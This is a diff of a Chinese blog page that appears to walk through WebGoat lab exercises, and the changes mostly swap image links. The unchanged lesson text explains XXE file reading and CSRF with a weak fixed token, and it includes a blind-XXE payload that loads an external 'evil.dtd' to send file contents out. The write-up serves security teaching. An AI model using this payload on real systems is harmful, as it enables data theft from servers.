@@ -272,7 +272,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon Jul 28 2025 10:03:20 GMT+0800">2025-07-28 10:03:20</span>
+                    <span class="datetime" data-updated="Mon Jul 28 2025 17:12:00 GMT+0800">2025-07-28 17:12:00</span>
                 </span>
             
         
@@ -347,13 +347,13 @@
 
 
 <h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>很简单，直接通过file协议读文件就行。记得注入的实体要写在text标签内，这样才能回显在评论区，才满足题目要求。同时注意一下windows下调用file协议读文件的格式，file:&#x2F;&#x2F;&#x2F;C:&#x2F;</p>
-<p><img   src="/WebGoat%E9%9D%B6%E5%9C%BA-%E9%94%99%E8%AF%AF%E7%9A%84%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/image-1753668122670.png"  alt="img"></p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753518378306-97bbe00d-1c96-45f8-92e7-6ab14c8a4294.png"  alt="img"></p>
 <p>源码部分，重点在org.owasp.webgoat.lessons.xxe.CommentsCache#parseXml：</p>
-<p><img   src="/WebGoat%E9%9D%B6%E5%9C%BA-%E9%94%99%E8%AF%AF%E7%9A%84%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/image-1753668122816.png"  alt="img"></p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753519744527-efd7eaca-5496-4c96-b567-139afa2ffcfd.png"  alt="img"></p>
 <p>这里调用xml解析时，securityEnabled默认是false的，所以运行外部实体和DTD。想要修复漏洞也很简单，把这些配置打开即可。由于业务中一般不会用到外部实体，所以对正常业务没有影响。</p>
 <h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>就是抓包手动将Content-Type改成application&#x2F;xml。payload和上面一致。</p>
 <p>源码部分就是根据Content-Type进入不同方法，没什么好说的</p>
-<p><img   src="/WebGoat%E9%9D%B6%E5%9C%BA-%E9%94%99%E8%AF%AF%E7%9A%84%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/image-1753668122687.png"  alt="img"></p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753519933879-43555d46-607a-4d9a-9b3a-faa0e817fdc2.png"  alt="img"></p>
 <h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>无回显的xxe。</p>
 <p>先看exp：</p>
 <p>dtd文件：</p>
@@ -363,7 +363,7 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">com</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:7778/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span>  <span class="tag">&lt;<span class="name">text</span>&gt;</span>3213 <span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>收到请求，记得url解码：</p>
-<p><img   src="/WebGoat%E9%9D%B6%E5%9C%BA-%E9%94%99%E8%AF%AF%E7%9A%84%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/image-1753668122839.png"  alt="img"></p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753523350028-ece34348-8ef0-472c-8129-22a285151cc2.png"  alt="img"></p>
 <p>下面介绍几种常见的错误写法：</p>
 <p>1、直接引用参数实体</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">com</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">test</span> <span class="string">&quot;aaaa&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % a <span class="string">&quot;%test;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">和</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">com</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">test</span> <span class="string">&quot;aaaa&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="string">&quot;%test;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
@@ -384,7 +384,7 @@
 <p>总之，很多情况下我们都需要依赖dtd去远程加载，然后再到主文档里展开。</p>
 <h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><h2 id="第一题-1"><a href="#第一题-1" class="headerlink" title="第一题"></a>第一题</h2><p>让你从非同源的host点击按钮，这里可以用到bp自带的工具：</p>
 <p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753665540852-2a5ca6dc-6dbc-4fff-828a-93dd30e502b2.png"  alt="img"></p>
-<p>这样可以直接生成一个表单，然后从非同源位置提交：<img   src="/WebGoat%E9%9D%B6%E5%9C%BA-%E9%94%99%E8%AF%AF%E7%9A%84%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/image-1753668122746.png"  alt="img"></p>
+<p>这样可以直接生成一个表单，然后从非同源位置提交：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753665592539-4c1b833c-801a-4d89-91c5-227265424863.png"  alt="img"></p>
 <p>源码方法，这里主要是根据referer和host的关系来判断：</p>
 <p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753665743964-f97eb939-839c-4070-b604-fee91f6344e5.png"  alt="img"></p>
 <h2 id="第二题-1"><a href="#第二题-1" class="headerlink" title="第二题"></a>第二题</h2><p>基本一样，但是这里多了一个weakAntiCSRF，相当于一个token吧，但是这个token是固定的，所以没有起到防护作用。</p>
